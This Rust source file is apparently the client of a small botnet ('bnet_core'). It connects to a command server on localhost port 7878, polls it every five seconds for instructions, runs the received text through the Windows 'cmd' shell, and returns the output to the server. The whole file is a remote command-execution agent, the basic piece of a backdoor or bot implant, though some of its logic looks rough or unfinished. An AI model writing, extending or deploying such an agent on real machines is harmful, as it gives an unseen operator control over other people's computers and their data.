use bnet_core::utils;
use std::io::Read;
use std::net::TcpStream;
use std::str::from_utf8;
mod terminal;

fn main() {
    match TcpStream::connect("localhost:7878") {
        Ok(mut stream) => {
            println!("Successfully connected to server in port 7878");

            let server_ok =
                utils::send_request_check(&stream, &utils::PING_REQUEST, &utils::PING_RESPONSE);

            if server_ok {
                loop {
                    std::thread::sleep(std::time::Duration::from_millis(5000));
                    let response = utils::send_request(&stream, &utils::ACTION_REQUEST);
                    if response == utils::ACTION_RESPONSE {
                        let mut err = "";
                        match std::process::Command::new("cmd")
                            .args(response.to_string()[3..].split(" "))
                            .output()
                        {
                            Ok(result) => {
                                let ACTION_RESULT: utils::Request = utils::Request {
                                    syl: 'A',
                                    num: '5',
                                    msg: String::from_utf8(result.stdout).unwrap(),
                                };
                                utils::send_request(&stream, &ACTION_RESULT);
                            }
                            Err(e) => {
                                let ACTION_RESULT: utils::Request = utils::Request {
                                    syl: 'A',
                                    num: '5',
                                    msg: e.to_string(),
                                };
                                utils::send_request(&stream, &ACTION_RESULT);
                                println!("Failed to execute: {}", e);
                            }
                        };
                    }
                }
            }
        }
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
}
